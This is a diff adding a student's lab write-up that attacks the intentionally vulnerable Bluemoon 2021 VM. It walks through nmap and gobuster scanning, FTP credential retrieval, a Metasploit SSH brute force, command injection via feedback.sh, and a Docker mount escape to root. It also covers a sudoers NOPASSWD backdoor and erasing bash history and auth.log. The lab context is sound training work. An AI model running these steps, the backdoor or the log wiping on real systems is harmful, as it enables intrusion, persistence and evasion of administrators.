@@ -2,6 +2,162 @@ Bluemoon 2021 (System Hacking Practice - Lab 2)
 
 Bluemoon (Victim)
 Kali Linux (Attacker, me)
+Bluemoon IP: 192.168.1.151
+Attacker's IP: 192.168.X.XXX
 
-1. Run <sudo netdiscover> command to find victim's IP. 
+It is a penetration testing process performed on the Bluemoon 2021 vulnerableVM as a part of a system
+hacking lab exercise. 
+
+1. Stage 1 - Reconnaissance 
+Tool: netdiscover, nmap 
+
+<sudo netdiscover>
+<nmap -sn 192.168.1.0/24> 
+- To find the victim's IP which is 192.168.1.151
+
+2. Stage 2 - Scanning & Enumeration
+Tool: gobuster, nmap, dirb
+
+<nmap -sC -sV -Pn -vv 192.168.1.151> 
+-sC > is to run default NSE scripts (service enumeration, basic vuln checks)
+-sV > to detect service versions on open ports
+-Pn > skip host discovery (which we assume the host is online)
+-vv > very verbose output which it shows progeress and results in real time
+
+I discovered 3 open ports which is: 
+Port 21 -- FTP (vsftpd 3.0.3)
+Port 22 -- SSH (OpenSSH) 
+Port 80 -- HTTP (Apache) 
+
+Run <gobuster dir> to find hidden files on a web server. 
+The result scanning showed that there were to files found. 
+</server_status> (403)
+</hidden_text> (200)
+Since the first one wasn't opened, I opened </hidden_text> 
+
+It directed to a page where it has link, I clicked the link and it directed me to an image
+which showed QR code. 
+Downloaded the QR code and decode it on any website.
+I found that there was a username and password. 
+
+USER= userftp
+PASSWORD= ftpp@ssword
+
+3. Stage 3 - Gaining Access
+To exploit the vulnerabilities discovere during scanning to gain unauthorized access to the target
+system.
+
+FTP Login:
+<ftp 192.168.1.151> 
+FTP > File Transfer Protocol 
+We attempted to log in using anonymous credentials. 
+
+After logging in,
+<ls>
+<get information.txt>
+<get p_lists.txt>
+
+<get> - to download the file that we found
+
+and back to our Kali, to read the content of the files, we run:
+<cat information.txt>
+<cat p_lists.txt>
+
+What we found after reading the contents of the files, information.txt revealed username "robin"
+and p_lists.txt contained a list of possible passwords. 
+
+SSH Brute Force with Metasploit:
+<msfconsole>
+<use auxiliary/scanner/ssh/ssh_login>
+<set RHOSTS 192.168.1.151>
+<set USERNAME robin>
+<set PASS_FILE /root/p_lists.txt>
+<run>
+
+<use auxiliary/scanner/ssh/ssh_login> - loads the SSH login scanner module
+<set RHOSTS 192.168.1.151> - set the target IP address
+<set USERNAME robin> - set username that we found
+<set PASS_FILE /root/p_lists.txt> - points to the password list we downloaded
+<run> - starts the brute force attack, by trying each password in the list
+
+Successfully found robin's password which is: "k4rv3ndh4nh4ck3r"
+
+SSH Login:
+<ssh robin@192.168.1.151>
+
+SSH - Secure Shell
+This allows to remote login to the target machine. Using the credentials we found. 
+
+4. Stage 4 - Privilege Escalation
+Process of gaining higher level permissions than what was initially granted. 
+
+Check Sudo permission:
+<sudo -l>
+- it lists all commands that the current user (robin) is allowed to run. 
+
+What we found: robin can run <feedback.sh> as user "jerry" without a password. 
+
+Exploit feedback.sh:
+<cd /home/robin/project>
+<sudo -u jerry ./feedback.sh>
+
+The sript content it showed: 
+#!/bin/bash
+clear
+echo -e "Script For FeedBack\n"
+read -p "Enter Your Name : " name
+echo ""
+read -p "Enter You Feedback About This Target Machine : " feedback
+echo ""
+$feedback 2>/dev/null
+echo -e "\nThanks For Your Feedback ... !\n"
+
+The key vulnerability is <$feedback 2>/dev/null>, whatever is typed in the feedback field gets executed
+as a command.
+This is called as "Command Injection Vulnerability"
+
+When prompted:
+Enter Your Name: <anything>
+Enter Your Feedback: /bin/bash -i
+
+Read Second Flag: 
+<cat /home/jerry/user2.txt>
+
+Escalate to root via Docker:
+<docker run -v /:/mnt --rm -it alpine chroot /mnt sh>
+
+<docker run> - starts a new docker container
+<-v /:/mnt> mounts the host's entire filesystem(/) inside the container at /mnt 
+<--rm> - automatically removes mode with a terminal
+<alpine> uses the lightweight alpine linux image
+<chroot /mnt sh> - changes the root directory
+
+5. Stage 5 - Maintain Access
+To ensures the attacker can return to the system even if the initial vulnerability is patched. It 
+is done by creating backdoors or persistent access methods. 
+
+<echo "echo 'robin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"> backup.sh>
+This created a script that adds robin to the sudoers file with full passwordless sudo access. 
+
+6. Stage 6 - Clear Tracks 
+After completing attack, attacker would remove evidence of their presence to avoid detection by system
+administrators or security tools. 
+
+<history -c> -clears the current session's command history from memory
+<rm -rf ~/.bash_history> -permanently deletes the bash hsitory file
+<truncate -s 0 /var/log/auth.log> - empties the authentication log which records all login attempts and
+sudo usage
+
+-------------------
+1. Expose FTP files can leak sensitive credentials. FTP servers should never store usernames or
+passwords lists. 
+2. Weak SSH passwords can be brute force. Always use strong, unique passwords. 
+
+
+
+
+
+
+
+
 
